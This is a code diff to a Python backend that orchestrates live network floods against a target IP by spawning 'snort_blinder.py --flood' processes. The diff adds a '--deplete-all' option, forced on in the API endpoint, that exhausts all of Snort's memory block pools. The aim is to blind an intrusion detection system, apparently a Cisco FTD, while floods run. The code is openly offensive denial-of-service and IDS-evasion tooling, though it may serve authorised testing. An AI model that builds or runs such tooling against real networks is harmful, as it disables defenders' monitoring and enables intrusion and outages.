@@ -4412,13 +4412,16 @@ def _multiattack_log(msg):
     print(f"[MULTI-ATTACK] {msg}")
 
 
-def _multiattack_worker(target_ip, protocols, duration, intensity, processes, ftd_config=None):
+def _multiattack_worker(target_ip, protocols, duration, intensity, processes,
+                        ftd_config=None, deplete_all=False):
     """
     Pure live-network flood.  Spawns snort_blinder.py --flood sub-processes
     locally.  Packets are sent directly from this machine to <target_ip>
     via real sockets — no Docker orchestration needed.
     ftd_config: optional dict {host, port, username, password} for SSH-based
     Snort monitoring on FTD (replaces Docker alert_fast.txt approach).
+    deplete_all: when True, passes --deplete-all to flood processes to target
+    all Snort memory block pools (0-2048), not just reassembly (2560).
     """
     global _multiattack_procs
     try:
@@ -4555,12 +4558,13 @@ def _multiattack_worker(target_ip, protocols, duration, intensity, processes, ft
             sf = f"/tmp/blinder_stats_{gi}.json"
             stats_files.append(sf)
             proto_list = ",".join(group)
+            deplete_flag = " --deplete-all" if deplete_all else ""
             flood_cmd = (
                 f"cd {script_dir} && python3 Testing/snort_blinder.py "
                 f"--flood --target {target_ip} --duration {duration} "
                 f"--phase-duration 15 --intensity {intensity} "
                 f"--protocols {proto_list} --stats-file {sf} "
-                f"--inject-rate {inject_rate}"
+                f"--inject-rate {inject_rate}{deplete_flag}"
             )
             proc = _subprocess.Popen(
                 ["bash", "-c", flood_cmd],
@@ -4837,6 +4841,7 @@ def api_multiattack_start():
     intensity = body.get("intensity", 3)
     processes = body.get("processes", 6)
     ftd_config = body.get("ftd_config", None)  # {host, port, username, password}
+    deplete_all = True
 
     # Validate
     valid_protos = [p for p in protocols if p in _BLINDER_PROTOCOL_REGISTRY]
@@ -4855,6 +4860,7 @@ def api_multiattack_start():
         "duration": duration,
         "intensity": intensity,
         "processes": processes,
+        "deplete_all": deplete_all,
     }
 
     # Set state immediately so the UI knows we're starting
@@ -4867,7 +4873,8 @@ def api_multiattack_start():
 
     _multiattack_thread = threading.Thread(
         target=_multiattack_worker,
-        args=(target_ip, valid_protos, duration, intensity, processes, ftd_config),
+        args=(target_ip, valid_protos, duration, intensity, processes, ftd_config,
+              deplete_all),
         daemon=True
     )
     _multiattack_thread.start()
